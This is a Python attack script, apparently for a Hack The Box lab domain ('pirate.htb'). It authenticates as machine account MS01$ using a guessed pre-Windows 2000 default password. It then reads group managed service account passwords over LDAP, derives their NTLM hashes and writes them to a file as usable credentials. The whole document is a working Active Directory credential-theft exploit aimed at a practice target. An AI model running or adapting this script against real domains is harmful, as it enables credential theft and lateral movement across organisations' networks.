#!/usr/bin/env python3
"""
Extract gMSA password using MS01$ machine account (pre2k password = 'ms01')
Uses impacket LDAP with NTLM authentication
"""
import hashlib
import struct
import sys

DC_IP = "10.129.8.87"
DC_HOST = "dc01.pirate.htb"
DOMAIN = "pirate.htb"
DOMAIN_DN = "DC=pirate,DC=htb"

# Monkey-patch DNS: resolve dc01.pirate.htb → 10.129.8.87
import socket
_orig_getaddrinfo = socket.getaddrinfo
def _patched_getaddrinfo(host, port, *args, **kwargs):
    if isinstance(host, str) and "pirate.htb" in host.lower():
        host = DC_IP
    return _orig_getaddrinfo(host, port, *args, **kwargs)
socket.getaddrinfo = _patched_getaddrinfo

_orig_gethostbyname = socket.gethostbyname
def _patched_gethostbyname(host):
    if isinstance(host, str) and "pirate.htb" in host.lower():
        return DC_IP
    return _orig_gethostbyname(host)
socket.gethostbyname = _patched_gethostbyname

# MS01$ with pre2k password 'ms01'
USERNAME = "ms01$"
PASSWORD = "ms01"

# Compute NTLM hash
def ntlm(password):
    return hashlib.new('md4', password.encode('utf-16-le')).digest()

ntlm_hash = ntlm(PASSWORD)
print(f"[*] MS01$ NTLM hash: {ntlm_hash.hex()}")

# Use impacket's ldap
from impacket.ldap import ldap, ldapasn1
from impacket.ldap.ldap import LDAPConnection
from impacket.smbconnection import SMBConnection

try:
    # Connect via LDAP with Kerberos (ccache)
    import os
    ccache_file = r"d:\mcp\redteam-server\ms01.ccache"
    os.environ["KRB5CCNAME"] = ccache_file
    print(f"[*] Using ccache: {ccache_file}")
    
    ldapc = ldap.LDAPConnection(f"ldap://{DC_HOST}", DOMAIN_DN, DC_IP)
    ldapc.kerberosLogin(USERNAME, '', DOMAIN, '', '', kdcHost=DC_IP, useCache=True)
    print(f"[+] LDAP connected via Kerberos as {USERNAME}")

    # Query gMSA accounts for msDS-ManagedPassword
    ATTRIBUTES = [
        'sAMAccountName',
        'msDS-ManagedPassword',
        'msDS-ManagedPasswordInterval',
        'msDS-GroupMSAMembership',
        'distinguishedName'
    ]

    print("\n[*] Searching for gMSA accounts with msDS-ManagedPassword...")
    
    sc = ldap.SimplePagedResultsControl(size=100)
    
    resp = ldapc.search(
        searchBase=DOMAIN_DN,
        searchFilter='(objectClass=msDS-GroupManagedServiceAccount)',
        attributes=ATTRIBUTES,
        sizeLimit=0,
        searchControls=[sc]
    )
    
    found = False
    answers = []
    for item in resp:
        if isinstance(item, ldapasn1.SearchResultEntry):
            answers.append(item)
    
    for item in answers:
        
        attribs = {}
        for attr in item['attributes']:
            attr_name = str(attr['type'])
            vals = [bytes(v) for v in attr['vals']]
            attribs[attr_name] = vals
        
        sam = attribs.get('sAMAccountName', [b'?'])[0].decode()
        print(f"\n[+] gMSA Account: {sam}")
        
        if 'msDS-ManagedPassword' in attribs and attribs['msDS-ManagedPassword']:
            found = True
            mp_blob = attribs['msDS-ManagedPassword'][0]
            print(f"    [+] Got msDS-ManagedPassword blob ({len(mp_blob)} bytes)")
            print(f"    Raw hex: {mp_blob.hex()}")
            
            # Parse MSDS-MANAGEDPASSWORD_BLOB
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-a0f2-428a-acba-bffd67dc41b6
            # Version (2) | Reserved (2) | Length (4) | CurrentPasswordOffset (2) |
            # PreviousPasswordOffset (2) | QueryPasswordIntervalOffset (2) | UnchangedPasswordIntervalOffset (2) | ...
            version = struct.unpack_from('<H', mp_blob, 0)[0]
            reserved = struct.unpack_from('<H', mp_blob, 2)[0]
            length = struct.unpack_from('<I', mp_blob, 4)[0]
            current_pw_offset = struct.unpack_from('<H', mp_blob, 8)[0]
            prev_pw_offset = struct.unpack_from('<H', mp_blob, 10)[0]
            query_interval_offset = struct.unpack_from('<H', mp_blob, 12)[0]
            unchanged_interval_offset = struct.unpack_from('<H', mp_blob, 14)[0]
            
            print(f"    Version: {version}")
            print(f"    CurrentPwOffset: {current_pw_offset}")
            print(f"    PrevPwOffset: {prev_pw_offset}")
            
            # Current password starts at current_pw_offset
            # Length = until next field offset (or end)
            if prev_pw_offset > 0:
                pw_len = prev_pw_offset - current_pw_offset
            else:
                pw_len = query_interval_offset - current_pw_offset
            
            current_pw = mp_blob[current_pw_offset:current_pw_offset + pw_len]
            print(f"    Current Password (hex, {len(current_pw)} bytes): {current_pw.hex()}")
            
            # NTLM = MD4(password_as_utf16le) - password IS already utf-16-le
            ntlm_h = hashlib.new('md4', current_pw).hexdigest()
            print(f"\n    [+] NTLM Hash: {ntlm_h}")
            print(f"    [+] USE: {sam}:{ntlm_h}")
            
            # Save credentials
            out = f"{sam}:{ntlm_h}\n"
            with open(r"d:\mcp\redteam-server\gmsa_hashes.txt", "a") as f:
                f.write(out)
            print(f"    [+] Saved to d:\\mcp\\redteam-server\\gmsa_hashes.txt")
        else:
            print(f"    [-] msDS-ManagedPassword: NOT READABLE (no permission or not present)")
    
    if not found:
        print("\n[-] No readable gMSA passwords found with MS01$ account")
        print("[*] MS01$ may not be in the allowed principals list")

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
